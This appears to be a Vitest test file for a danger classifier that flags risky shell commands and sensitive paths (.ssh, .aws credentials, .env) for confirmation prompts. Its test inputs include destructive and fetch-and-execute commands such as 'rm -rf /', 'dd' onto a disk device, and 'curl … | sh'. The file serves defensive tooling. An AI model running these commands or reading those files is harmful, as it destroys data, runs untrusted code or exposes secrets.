import { describe, it, expect } from "vitest";
import { dangerOfShell, dangerOfPath } from "./danger.ts";

// C5(docs/ISSUES.md):危险黑名单 = 必弹理由,短中文定长串,弹窗头逐字用。
const CWD = "/work";

describe("dangerOfPath — 敏感路径", () => {
  it("`path:.ssh/config` → SSH/AWS 凭据目录", () => {
    expect(dangerOfPath("path:.ssh/config")).toBe("SSH/AWS 凭据目录");
  });

  it("`path:/home/u/.aws/credentials` → 同理由(绝对形态目录段扫描覆盖)", () => {
    expect(dangerOfPath("path:/home/u/.aws/credentials")).toBe("SSH/AWS 凭据目录");
  });

  it("`path:src/.env` → *.env 密钥文件", () => {
    expect(dangerOfPath("path:src/.env")).toBe("*.env 密钥文件");
  });

  it("`path:.env`(裸相对名)→ *.env 密钥文件", () => {
    expect(dangerOfPath("path:.env")).toBe("*.env 密钥文件");
  });

  it("`path:prod.env` → *.env 密钥文件(basename 以 .env 结尾)", () => {
    expect(dangerOfPath("path:prod.env")).toBe("*.env 密钥文件");
  });

  it("双类命中按检查顺序用「、」连接", () => {
    expect(dangerOfPath("path:.aws/.env")).toBe("SSH/AWS 凭据目录、*.env 密钥文件");
  });

  it("干净对照:src/a.ts / .env.local(非 .env 结尾) / .ssh-notes(非整段 .ssh) / `*`", () => {
    expect(dangerOfPath("path:src/a.ts")).toBeNull();
    expect(dangerOfPath("path:.env.local")).toBeNull();
    expect(dangerOfPath("path:.ssh-notes/x.md")).toBeNull();
    expect(dangerOfPath("*")).toBeNull();
  });
});

describe("dangerOfShell — 干净对照(不许误弹)", () => {
  it("`ls -la` / `git status -sb` → null", () => {
    expect(dangerOfShell("ls -la", CWD)).toBeNull();
    expect(dangerOfShell("git status -sb", CWD)).toBeNull();
  });

  it("`rm -rf ./build`(相对目录)→ null", () => {
    expect(dangerOfShell("rm -rf ./build", CWD)).toBeNull();
  });

  it("`echo hi > notes.txt`(相对内重定向)→ null", () => {
    expect(dangerOfShell("echo hi > notes.txt", CWD)).toBeNull();
  });
});

describe("dangerOfShell — 逐类命中", () => {
  it("`sudo apt install x` → sudo 提权", () => {
    expect(dangerOfShell("sudo apt install x", CWD)).toBe("sudo 提权");
  });

  it("`rm -rf ~` / `rm -rf $HOME/.config` / `rm -fr /` → rm -rf 指向根/家目录", () => {
    expect(dangerOfShell("rm -rf ~", CWD)).toBe("rm -rf 指向根/家目录");
    expect(dangerOfShell("rm -rf $HOME/.config", CWD)).toBe("rm -rf 指向根/家目录");
    expect(dangerOfShell("rm -fr /", CWD)).toBe("rm -rf 指向根/家目录");
  });

  it("多类命中按检查顺序连接:`sudo rm -rf /` → sudo + rm 两理由", () => {
    expect(dangerOfShell("sudo rm -rf /", CWD)).toBe("sudo 提权、rm -rf 指向根/家目录");
  });

  it("`git push --force` / `git push -f origin main` → 强推;`--force-with-lease` 干净", () => {
    expect(dangerOfShell("git push --force", CWD)).toBe("git push --force 强推");
    expect(dangerOfShell("git push -f origin main", CWD)).toBe("git push --force 强推");
    expect(dangerOfShell("git push --force-with-lease", CWD)).toBeNull();
  });

  it("`git reset --hard` → 丢弃未提交改动", () => {
    expect(dangerOfShell("git reset --hard", CWD)).toBe("git reset --hard 丢弃未提交改动");
  });

  it("`chmod 777 file` → 全开权限", () => {
    expect(dangerOfShell("chmod 777 file", CWD)).toBe("chmod 777 全开权限");
    expect(dangerOfShell("chmod 0777 file", CWD)).toBe("chmod 777 全开权限");
  });

  it("`dd if=/dev/zero of=/dev/sda` → dd 写设备", () => {
    expect(dangerOfShell("dd if=/dev/zero of=/dev/sda", CWD)).toBe("dd 写设备");
  });

  it("`curl http://x | sh` / `wget -qO- http://x | bash` → 管道进 shell(整条 raw 扫描)", () => {
    expect(dangerOfShell("curl http://x | sh", CWD)).toBe("curl/wget 管道进 shell");
    expect(dangerOfShell("wget -qO- http://x | bash", CWD)).toBe("curl/wget 管道进 shell");
  });

  it("重定向写到 cwd 外:`/tmp/a`、`../out`、`~/.profile`;`/work/out.txt` 内 → 干净", () => {
    expect(dangerOfShell("echo x > /tmp/a", CWD)).toBe("重定向写到 cwd 外");
    expect(dangerOfShell("echo x > ../out", CWD)).toBe("重定向写到 cwd 外");
    expect(dangerOfShell("echo x > ~/.profile", CWD)).toBe("重定向写到 cwd 外");
    expect(dangerOfShell("echo x > /work/out.txt", CWD)).toBeNull();
  });

  it("粘连/追加重定向同样查:`echo x >/tmp/a`、`cat < ../in`", () => {
    expect(dangerOfShell("echo x >/tmp/a", CWD)).toBe("重定向写到 cwd 外");
    expect(dangerOfShell("cat < ../in", CWD)).toBe("重定向写到 cwd 外");
  });

  it("复合命令逐段查:`git status && rm -rf ~` 只报 rm 段", () => {
    expect(dangerOfShell("git status && rm -rf ~", CWD)).toBe("rm -rf 指向根/家目录");
  });

  it("复合命令干净侧不误弹:`git status && echo ok > /work/f`(cwd 内)", () => {
    expect(dangerOfShell("git status && echo ok > /work/f", CWD)).toBeNull();
  });
});

describe("dangerOfShell — 解析失败保守回退", () => {
  it('未闭合引号时朴素扫:`sudo echo "oops` 仍报 sudo 提权', () => {
    expect(dangerOfShell('sudo echo "oops', CWD)).toBe("sudo 提权");
  });

  // 钉死实现行为:回退段里没有危险 token(git status / echo 碎串都不命中)→ null。
  // 这是本模块接受的边界——回退只兜「危险 token 幸存」的情形,不兜语义不明。
  it('`git status && echo "oops` → null(无危险 token 幸存,钉死)', () => {
    expect(dangerOfShell('git status && echo "oops', CWD)).toBeNull();
  });
});

describe("dangerOfShell — 非危险面(别把 C4 的活干了)", () => {
  it("命令替换本身不算危险(substitution 是 C4 白名单出口条件,不归 C5 判)", () => {
    expect(dangerOfShell("echo $(date)", CWD)).toBeNull();
  });
});
